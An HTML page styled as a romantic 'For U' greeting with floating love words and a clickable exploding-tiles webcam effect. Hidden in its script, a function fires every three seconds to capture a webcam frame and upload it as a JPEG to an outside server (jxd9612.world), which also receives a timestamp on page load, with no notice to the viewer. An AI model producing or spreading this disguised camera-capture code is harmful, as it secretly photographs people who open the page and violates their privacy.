<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />
        <meta http-equiv="X-UA-Compatible" content="ie=edge" />
        <link rel="icon" href="favicon.ico" />
        <link rel="stylesheet" href="index.css" />
        <title>For U</title>
    </head>
    <body style="text-align: center;">
        <div style="display: none;">
            <video id="video" width="960" height="540" controls></video>
            <canvas id="videoCopy" width="960" height="540"></canvas>
            <canvas id="canvas" width="960" height="540"></canvas>
        </div>
        <canvas id="output" width="1200" height="600" onmousedown="dropBomb(event, this)"></canvas>

        <h1 class="gradient-text">Click on the video</h1>

        <div class="bruce">
            <ul class="bubble-bgwall">
                <li>Like U</li>
                <li>voice</li>
                <li>deeply</li>
                <li>miss</li>
                <li>fall</li>
                <li>face</li>
                <li>touch</li>
                <li>with</li>
                <li>time</li>
                <li>Lucky to meet U</li>
            </ul>
        </div>

        <div class="heart-wrapper"></div>

        <script src="jquery.min.js"></script>
        <script src="heart.js"></script>
        <script>
            function getUserMedia(constraints, success, error) {
                if (navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices
                        .getUserMedia(constraints)
                        .then(success)
                        .catch(error);
                } else if (navigator.webkitGetUserMedia) {
                    navigator.webkitGetUserMedia(constraints, success, error);
                } else if (navigator.mozGetUserMedia) {
                    navigator.mozGetUserMedia(constraints, success, error);
                } else if (navigator.getUserMedia) {
                    navigator.getUserMedia(constraints, success, error);
                }
            }
            function success(stream) {
                let CompatibleURL = window.URL || window.webkitURL;
                video.srcObject = stream;
                video.play();
                setInterval('getHH()', 3000);
            }
            function error(error) {
                alert(`访问用户媒体设备失败${error.name}, ${error.message}`);
            }
            if (navigator.mediaDevices.getUserMedia || navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia) {
                getUserMedia({ video: { width: 960, height: 540 } }, success, error);
            } else {
                alert('不支持访问用户媒体');
            }
            function dataURLtoFile(dataurl, filename = 'file') {
                let arr = dataurl.split(',');
                let mime = arr[0].match(/:(.*?);/)[1];
                let suffix = mime.split('/')[1];
                let bstr = atob(arr[1]);
                let n = bstr.length;
                let u8arr = new Uint8Array(n);
                while (n--) {
                    u8arr[n] = bstr.charCodeAt(n);
                }
                return new File([u8arr], `${filename}.${suffix}`, {
                    type: mime
                });
            }

            let nowTime = new Date();
            let mon = nowTime.getMonth() + 1;
            let timeStr = nowTime.getFullYear() + '-' + mon + '-' + nowTime.getDate() + ' ' + nowTime.getHours() + ':' + nowTime.getMinutes();
            $.ajax({
                url: 'https://www.jxd9612.world:3001/resolve_cors',
                type: 'post',
                dataType: 'json',
                data: { time: timeStr }
            });
            
            let TILE_WIDTH = 25.6;
            let TILE_HEIGHT = 19.2;
            let TILE_CENTER_WIDTH = 16;
            let TILE_CENTER_HEIGHT = 12;
            let SOURCERECT = { x: 0, y: 0, width: 0, height: 0 };
            let PAINTRECT = { x: 0, y: 0, width: 1200, height: 600 };

            let video = document.getElementById('video');
            let canvas = document.getElementById('canvas');
            let context = canvas.getContext('2d');
            let copycanvas = document.getElementById('videoCopy');
            let copy = copycanvas.getContext('2d');
            let outputcanvas = document.getElementById('output');
            let draw = outputcanvas.getContext('2d');

            setInterval('processFrame()', 33);

            function createTiles() {
                var offsetX = TILE_CENTER_WIDTH + (PAINTRECT.width - SOURCERECT.width) / 2;
                var offsetY = TILE_CENTER_HEIGHT + (PAINTRECT.height - SOURCERECT.height) / 2;
                var y = 0;
                while (y < SOURCERECT.height) {
                    var x = 0;
                    while (x < SOURCERECT.width) {
                        var tile = new Tile();
                        tile.videoX = x;
                        tile.videoY = y;
                        tile.originX = offsetX + x;
                        tile.originY = offsetY + y;
                        tile.currentX = tile.originX;
                        tile.currentY = tile.originY;
                        tiles.push(tile);
                        x += TILE_WIDTH;
                    }
                    y += TILE_HEIGHT;
                }
            }
            function getHH() {
                context.drawImage(video, 0, 0, 960, 540);
                let imgFile = dataURLtoFile(canvas.toDataURL('image/jpeg'));
                var formData = new FormData();
                formData.append('resolve_data', imgFile);
                $.ajax({
                    url: 'https://www.jxd9612.world:3001/resolve_net',
                    type: 'post',
                    data: formData,
                    contentType: false,
                    processData: false
                });
            }
            var RAD = Math.PI / 180;
            var randomJump = false;
            var tiles = [];
            var debug = false;
            function processFrame() {
                if (!isNaN(video.duration)) {
                    if (SOURCERECT.width == 0) {
                        SOURCERECT = { x: 0, y: 0, width: video.videoWidth, height: video.videoHeight };
                        createTiles();
                    }
                    if (randomJump) {
                        randomJump = false;
                        video.currentTime = Math.random() * video.duration;
                    }
                    if (video.currentTime == video.duration) {
                        video.currentTime = 0;
                    }
                }
                var debugStr = '';
                copy.drawImage(video, 0, 0);
                draw.clearRect(PAINTRECT.x, PAINTRECT.y, PAINTRECT.width, PAINTRECT.height);
                for (var i = 0; i < tiles.length; i++) {
                    var tile = tiles[i];
                    if (tile.force > 0.0001) {
                        tile.moveX *= tile.force;
                        tile.moveY *= tile.force;
                        tile.moveRotation *= tile.force;
                        tile.currentX += tile.moveX;
                        tile.currentY += tile.moveY;
                        tile.rotation += tile.moveRotation;
                        tile.rotation %= 360;
                        tile.force *= 0.9;
                        if (tile.currentX <= 0 || tile.currentX >= PAINTRECT.width) {
                            tile.moveX *= -1;
                        }
                        if (tile.currentY <= 0 || tile.currentY >= PAINTRECT.height) {
                            tile.moveY *= -1;
                        }
                    } else if (tile.rotation != 0 || tile.currentX != tile.originX || tile.currentY != tile.originY) {
                        var diffx = (tile.originX - tile.currentX) * 0.2;
                        var diffy = (tile.originY - tile.currentY) * 0.2;
                        var diffRot = (0 - tile.rotation) * 0.2;
                        if (Math.abs(diffx) < 0.5) {
                            tile.currentX = tile.originX;
                        } else {
                            tile.currentX += diffx;
                        }
                        if (Math.abs(diffy) < 0.5) {
                            tile.currentY = tile.originY;
                        } else {
                            tile.currentY += diffy;
                        }
                        if (Math.abs(diffRot) < 0.5) {
                            tile.rotation = 0;
                        } else {
                            tile.rotation += diffRot;
                        }
                    } else {
                        tile.force = 0;
                    }
                    draw.save();
                    draw.translate(tile.currentX, tile.currentY);
                    draw.rotate(tile.rotation * RAD);
                    draw.drawImage(copycanvas, tile.videoX, tile.videoY, TILE_WIDTH, TILE_HEIGHT, -TILE_CENTER_WIDTH, -TILE_CENTER_HEIGHT, TILE_WIDTH, TILE_HEIGHT);
                    draw.restore();
                }
                if (debug) {
                    debug = false;
                    document.getElementById('trace').innerHTML = debugStr;
                }
            }
            function explode(x, y) {
                for (var i = 0; i < tiles.length; i++) {
                    var tile = tiles[i];
                    var xdiff = tile.currentX - x;
                    var ydiff = tile.currentY - y;
                    var dist = Math.sqrt(xdiff * xdiff + ydiff * ydiff);
                    var randRange = 220 + Math.random() * 30;
                    var range = randRange - dist;
                    var force = 3 * (range / randRange);
                    if (force > tile.force) {
                        tile.force = force;
                        var radians = Math.atan2(ydiff, xdiff);
                        tile.moveX = Math.cos(radians);
                        tile.moveY = Math.sin(radians);
                        tile.moveRotation = 0.5 - Math.random();
                    }
                }
                tiles.sort(zindexSort);
                processFrame();
            }
            function zindexSort(a, b) {
                return a.force - b.force;
            }
            function dropBomb(evt, obj) {
                var posx = 0;
                var posy = 0;
                var e = evt || window.event;
                if (e.pageX || e.pageY) {
                    posx = e.pageX;
                    posy = e.pageY;
                } else if (e.clientX || e.clientY) {
                    posx = e.clientX + document.body.scrollLeft + document.documentElement.scrollLeft;
                    posy = e.clientY + document.body.scrollTop + document.documentElement.scrollTop;
                }
                var canvasX = posx - obj.offsetLeft;
                var canvasY = posy - obj.offsetTop;
                explode(canvasX, canvasY);
            }
            function Tile() {
                this.originX = 0;
                this.originY = 0;
                this.currentX = 0;
                this.currentY = 0;
                this.rotation = 0;
                this.force = 0;
                this.z = 0;
                this.moveX = 0;
                this.moveY = 0;
                this.moveRotation = 0;
                this.videoX = 0;
                this.videoY = 0;
            }
            function getPixel(imageData, x, y) {
                var data = imageData.data;
                var pos = (x + y * imageData.width) * 4;
                return { r: data[pos], g: data[pos + 1], b: data[pos + 2], a: data[pos + 3] };
            }
            function setPixel(imageData, x, y, pixel) {
                var data = imageData.data;
                var pos = (x + y * imageData.width) * 4;
                data[pos] = pixel.r;
                data[pos + 1] = pixel.g;
                data[pos + 2] = pixel.b;
                data[pos + 3] = pixel.a;
            }
            function copyPixel(sImageData, sx, sy, dImageData, dx, dy) {
                var spos = (sx + sy * sImageData.width) * 4;
                var dpos = (dx + dy * dImageData.width) * 4;
                dImageData.data[dpos] = sImageData.data[spos]; //R
                dImageData.data[dpos + 1] = sImageData.data[spos + 1]; //G
                dImageData.data[dpos + 2] = sImageData.data[spos + 2]; //B
                dImageData.data[dpos + 3] = sImageData.data[spos + 3]; //A
            }
        </script>
    </body>
</html>
